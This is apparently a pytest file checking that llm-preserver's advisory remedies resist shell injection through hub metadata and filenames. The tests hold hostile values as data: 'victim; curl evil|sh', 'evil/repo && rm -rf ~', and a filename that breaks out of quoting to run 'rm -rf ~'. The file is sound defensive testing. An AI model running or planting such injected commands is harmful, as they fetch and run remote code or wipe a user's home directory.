"""Remedy-string hardening for advisories (spec 0005 adjudications).

Advisories print copy-pastable remedies built from hub-controlled
strings (filenames, base_model metadata, adapter config values).
Pinned here: companion patterns use llama.cpp's substring semantics,
runnable ``run: llm-preserver pull ...`` remedies are emitted only
for well-formed hub repo ids, and ``--include`` remedies are
shell-quoted so a hostile filename cannot escape them.
"""

import shlex

from llm_preserver.hub import RepoFile
from llm_preserver.pull_advisory import advisories_for

QUANT_REPO = "bartowski/tiny-chat-GGUF"


def rf(path: str, size: int = 100) -> RepoFile:
    return RepoFile(path=path, size=size, sha256=None)


def advise(tree, selected, **overrides):
    kwargs = {
        "repo_id": QUANT_REPO,
        "base_model": None,
        "adapter_base": None,
        "archived_repos": frozenset(),
    }
    kwargs.update(overrides)
    return advisories_for(tree, selected, None, **kwargs)


def test_mid_name_mmproj_triggers_the_advisory():
    # llama.cpp classifies companions by substring (download.cpp
    # excludes filenames *containing* mmproj); real repos ship
    # <model>-mmproj-f16.gguf, which a prefix-only pattern would miss —
    # the gemma failure shape all over again.
    tree = [rf("gemma-tiny-Q4_K_M.gguf"), rf("gemma-tiny-mmproj-f16.gguf")]

    advisories = advise(tree, [tree[0]])

    assert [a.kind for a in advisories] == ["vision projector"]


def test_hostile_adapter_base_never_becomes_a_runnable_command():
    hostile = "victim; curl evil|sh"
    tree = [rf("adapter_model.safetensors")]

    advisories = advise(tree, tree, adapter_base=hostile)

    [advisory] = advisories
    assert advisory.kind == "adapter base model"
    assert "run: llm-preserver pull" not in advisory.message
    assert "not a valid hub repo id" in advisory.message


def test_hostile_base_model_never_becomes_a_runnable_command():
    hostile = "evil/repo && rm -rf ~"
    tree = [rf("tiny-chat-Q4_K_M.gguf")]

    advisories = advise(tree, tree, base_model=hostile)

    [advisory] = advisories
    assert advisory.kind == "full-precision master"
    assert "run: llm-preserver pull" not in advisory.message
    assert "not a valid hub repo id" in advisory.message


def test_well_formed_repo_ids_keep_the_runnable_remedy():
    tree = [rf("tiny-chat-Q4_K_M.gguf")]

    advisories = advise(
        tree,
        tree,
        base_model="Qwen/Qwen3-0.6B",
        adapter_base="acme/base-7b",
    )

    messages = [a.message for a in advisories]
    assert any("run: llm-preserver pull acme/base-7b" in m for m in messages)
    assert any("run: llm-preserver pull Qwen/Qwen3-0.6B --whole-repo" in m for m in messages)


def test_include_remedy_is_shell_quoted_against_hostile_filenames():
    # A single quote in a hub filename must not break out of the
    # suggested --include argument when copy-pasted into a shell.
    hostile_name = "mmproj-x'; rm -rf ~ #.gguf"
    tree = [rf("tiny-chat-Q4_K_M.gguf"), rf(hostile_name)]

    advisories = advise(tree, [tree[0]])

    [advisory] = advisories
    remedy = advisory.message.split("--include", 1)[1].strip()
    assert remedy == shlex.quote(f"*{hostile_name}")
    assert shlex.split(remedy) == [f"*{hostile_name}"]
